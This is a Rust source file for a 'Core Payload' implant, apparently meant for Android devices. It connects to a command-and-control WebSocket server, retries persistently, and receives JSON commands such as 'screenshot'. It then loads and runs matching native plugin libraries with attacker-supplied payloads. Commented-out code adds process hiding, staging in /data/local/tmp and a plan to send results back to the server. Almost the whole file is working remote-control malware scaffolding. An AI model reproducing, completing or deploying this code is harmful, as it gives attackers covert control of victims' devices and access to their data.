use url::Url;
use std::env;
use serde::Deserialize;
use serde_json;
use libloading::{Library, Symbol};
use std::ffi::{CStr, CString};
use std::os::raw::{c_char, c_int};

#[cfg(feature = "ssl")]
use futures_util::StreamExt;

#[cfg(feature = "ssl")]
// use std::time::Duration;
use tokio_tungstenite::tungstenite::protocol::Message;
// use tokio_tungstenite::tungstenite::Error;
#[cfg(feature = "ssl")]
use tokio_tungstenite::connect_async;

#[derive(Deserialize, Debug)] 
struct Command { 
    action: String, 
    payload: String, 
    
} 


type PluginFunc = unsafe extern "C" fn(payload: *const c_char) -> *mut c_char; 
// unsafe fn execute_action(action: *const c_char, payload: *const c_char) -> c_int{
//     let action = CStr::from_ptr(action).to_string_lossy();
//     0
// }
 
#[no_mangle]
pub extern "C" fn rust_main() -> c_int {
  
    match tokio::runtime::Runtime::new() {
        Ok(rt) => {
            rt.block_on(main_internal());
            0 
        },
        Err(_) => {
            eprintln!("Failed to create Tokio runtime");
            -1 
        }
    }
}
// #[cfg(feature = "self_stealth")]
// mod stealth;



#[cfg_attr(target_os = "android", allow(dead_code))]
fn main() {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(main_internal());
    // let lib = Library::new("/data/local/tmp/libcore_pagload.so").unwrap();
    // stealth::hide_process();

}


async fn main_internal() {
    println!("Core Payload started. Attempting to connect to C2..."); 

    // let lib = Library::new("/data/local/tmp/libcore_pagload.so").unwrap();
    // let init: Symbol<PluginInitFunc> = unsafe { lib.get(b"init\0").unwrap() };
    // let init: PluginInitFunc = init as PluginInitFunc;
    
    // init();

    let c2_url = "ws://127.0.0.1:8080/ws?id=android-device-1"; 

    let url = Url::parse(c2_url).expect("Invalid C2 URL"); 


    println!("Would connect to: {}", c2_url);
    

    #[cfg(not(feature = "ssl"))]
    {
        println!("SSL disabled: Simulating C2 connection");
      
        let sample_command = r#"{"action":"screenshot","payload":"{}"}"#;
        if let Ok(cmd) = serde_json::from_str::<Command>(sample_command) {

            println!("sample command: {:?}", cmd);
            // let encrypted = encrypt_command(&cmd);
            // println!("encrypted command: {:?}", encrypt_command(&cmd));
            // let decrypted = decrypt_command(&encrypted);
            handle_command(cmd);
        }
    }
    

    #[cfg(feature = "ssl")]
    loop { 
        match connect_async(url.clone()).await { 
            Ok((ws_stream, _)) => { 
                println!("Successfully connected to C2 server."); 
                let (_write, mut read) = ws_stream.split(); 

             
                while let Some(msg) = read.next().await { 
                    match msg { 
                        Ok(Message::Text(text)) => { 
                            println!("Received command: {}", text); 
                            if let Ok(command) = serde_json::from_str::<Command>(&text) { 
                                tokio::spawn(async move { 
                                    handle_command(command); 
                                }); 
                            } 
                            
                        } 
                        Ok(_) => { /* Ignore other message types */ } 
                        Err(e) => { 
                            eprintln!("Error reading from WebSocket: {}", e); 
                            break; 

                        } 
                    } 
                } 
            } 
            Err(e) => { 
                eprintln!("Failed to connect to C2: {}. Retrying in 10 seconds...", e); 
                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await; 
            } 
            // Err(e)=>{
            //     eprintln!("Failed to connect to C2: {}. Retrying in 10 seconds...", e);
            //     tokio::time::sleep(tokio::time::Duraton::from_secs(10).await;
            // )
            // }


        } 
    } 
} 

fn handle_command(command: Command) { 
    println!("Handling action: {}", command.action); 

    let plugin_name = format!("lib{}.so", command.action.to_lowercase().replace("_", "")); 
    let plugin_path = env::current_dir().unwrap().join(&plugin_name); 

    println!("Attempting to load plugin: {:?}", plugin_path); 

    unsafe { 
        match Library::new(&plugin_path) { 
            Ok(lib) => { 
                println!("Plugin loaded successfully: {}", plugin_name); 
                match lib.get::<Symbol<PluginFunc>>(b"execute_action\0") { 
                    Ok(execute_action) => { 
                        println!("Found 'execute_action' symbol in plugin."); 
                        let c_payload = CString::new(command.payload).unwrap(); 
                        
                   
                        let result_ptr = execute_action(c_payload.as_ptr()); 
                        
                        if !result_ptr.is_null() { 
                            let result = CStr::from_ptr(result_ptr).to_string_lossy().into_owned(); 
                            println!("Plugin result: {}", result); 
                            // TODO: Send result back to C2
                            libc::free(result_ptr as *mut libc::c_void); // Free memory allocated by C
                        } 
                    } 
                    Err(e) => eprintln!("Could not find symbol 'execute_action' in {}: {}", plugin_name, e), 
                } 
            } 
            Err(e) => eprintln!("Could not load plugin {}: {}", plugin_name, e), 
        } 
    } 
}